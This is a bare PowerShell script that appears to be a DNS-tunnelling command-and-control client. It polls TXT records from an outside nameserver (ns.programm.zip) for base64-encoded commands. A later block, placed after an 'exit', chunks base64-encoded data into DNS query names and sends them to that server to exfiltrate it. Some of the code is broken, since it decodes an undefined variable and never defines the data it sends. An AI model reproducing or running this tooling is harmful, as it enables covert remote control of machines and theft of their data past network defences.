$domain = "dnshell.programm.zip"
$code = "123"

# Request TXT record from DNS server
$commandcount = 0
$stop = $false
while(!$stop){
    Write-Host "Request to: $commandcount.$code.$domain"
    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Server ns.programm.zip -Type TXT
    if ($dnsResult) {
        $decodedResponse = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.Substring(0, $response.Length - 9)))
        Write-Output $decodedResponse
    }
    else{
        
    }
    $commandcount++
    Start-Sleep -Seconds 2
}

exit;
# Encode data as Base64
$encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))

# Replace padding characters with _ so it can be transmitted over DNS
$encodedData = $encodedData.Replace("=", "_")

$chunks = [Math]::Ceiling($encodedData.Length / 63) # Calculate the number of chunks

for ($i = 0; $i -lt $chunks; $i++) {
    $currentChunk = $encodedData.Substring($i * 63, [Math]::Min(63, $encodedData.Length - $i * 63))
    $query = "$i.$chunks.$code.$domain"
    $dnsQuery = "$currentChunk.$query"

    # Send DNS query
    $dnsResult = Resolve-DnsName -Name $dnsQuery -Server ns.programm.zip

    if ($dnsResult) {
        # Never has a response ready, hopefully :-)
    }
}